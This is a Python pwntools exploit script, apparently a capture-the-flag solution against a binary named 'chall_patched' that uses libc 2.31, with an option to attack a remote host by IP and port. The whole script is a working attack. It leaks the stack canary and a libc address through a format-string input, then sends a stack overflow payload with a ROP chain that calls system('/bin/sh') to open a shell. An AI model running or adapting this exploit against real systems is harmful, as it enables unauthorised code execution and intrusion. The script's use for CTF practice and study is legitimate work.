from pwn import *
from icecream import ic

elf = exe = ELF("./chall_patched")
libc = ELF("./libc-2.31.so")
ld = ELF("./ld-2.31.so")

context.binary = exe
context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("34.107.71.117", 30172)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
pie b 0x124e
pie b 0x12c5
pie b 0x00000000000012e2
c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a, drop = True)
def rl(): return io.recvline()
def gad(a, b): return ROP(a).find_gadget([f"pop " + b, "ret"])[0]
def i(): return io.interactive()

io = start()

sl(b'%9$p')
ru(b'$ ')
canary = int(ru("What is this? "), 16)
libc.address = int(rl().strip(), 16) - libc.sym['printf']

ret = libc.address + 0x00000000000be2f9
payload = b'a'*0x18
payload += p64(canary)
payload += b'a'*8
payload += p64(ret)
payload += p64(gad(libc, "rdi"))
payload += p64(next(libc.search("/bin/sh\x00")))
payload += p64(libc.sym['system'])
payload += b'a'*0x100
sl(payload)
io.interactive()
